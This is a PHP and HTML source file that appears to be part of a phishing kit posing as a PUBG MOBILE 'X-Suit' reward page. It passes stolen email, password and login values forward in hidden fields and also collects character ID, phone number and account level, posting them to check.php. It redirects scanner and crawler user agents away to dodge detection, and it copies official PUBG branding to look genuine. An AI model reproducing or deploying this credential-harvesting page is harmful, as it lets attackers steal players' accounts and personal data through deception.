<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

if($email == "" && $password == "" && $login == ""){
header("Location: index.php");
}
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content=" X-Suit">
<meta name="description" content="Warrior of Legends Hit the Front Lines">
<meta property="og:description" content="Warrior of Legends Hit the Front Lines">
<meta property="og:url" content="./">
<meta property="og:site_name" content=" X-Suit">
<meta property="og:type" content="website">
<meta name="copyright"content="PUBG MOBILE">
<meta name="theme-color" content="#000">
<meta property="og:image" content="img/kv_logo.jpg">
<title>X-Suit</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="https://www.pubgmobile.com/common/images/icon_logo.jpg">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="containerHome2 rewardsBox">
<div class="navbar">
<img class="navbar-logo" src="https://i.postimg.cc/SxQ04Qn4/navbar-logo.png">
<div class="navbar-right">
<img class="navbar-shop" src="https://www.pubgmobile.com/en/images/nav_shop.svg">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_language.svg">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_menu.svg">
<div class="navbar-download"><img src="https://www.pubgmobile.com/en/images/nav_download.svg"></div>
</div> <!--- navbar-right --->
</div> <!--- navbar --->
<div class="headernamek">
<video src="media/header1.mp4" autoplay loop muted></video>
</div> <!--- header --->
<div class="box">
<center>
<div class="alert-wrapper">
<div class="alert">
<div class="alert-time">
<div id="latestTimer"></div>
</div>
<div class="slider animated fadeIn">Complete your data before continuing</div>
</div>
</div><!--- details-tit-box --->
<div class="menu-wrapper-border"></div> <!--- menu-wrapper-border --->
<form action="check.php" method="post">
<input type="hidden" name="email" value="<?php echo $email;?>" readonly>
<input type="hidden" name="password" value="<?php echo $password;?>" readonly>
<input type="number" class="verify-input" name="playid" id="playid" placeholder="Character ID" autocomplete="off" required>
<input type="number" class="verify-input" name="phone" id="phone" placeholder="Phone Number" autocomplete="off" required>
<select class="verify-input" name="level" id="level" required>
<option selected="selected" disabled="disabled" value="">Account Level</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<input type="hidden" name="login" value="<?php echo $login;?>" readonly>
<button type="submit" onmousedown="buka.play();" class="verify-btn">Submit</button>
</form>
</center>
<div class="twitter-content">
                            <p class="awalbtn"><i></i>TWITTER</p>
                            <p class="com_main">
                                <a class="twitter-timeline" href="https://twitter.com/PUBGMOBILE" data-theme="dark" data-height="inherit" data-chrome="noheader nofooter" onclick="gtag('event', 'x_click', {'event_category': 'website','event_label': 'pc_par_community_twitter'});"></a>
                            </p>
                        </div>
                    
                    
                </div>
                <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
                <a href="#" class="btn-top"></a>
            </div>
        </section>
        <div class="dialog">
            <div class="pop pop1" id="pop1">
                <div>
</div> <!--- box --->
<img src="img/footer.jpg" style="width: 100%">
</div> <!--- footer --->

<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/script.js"></script>

</body>
</html>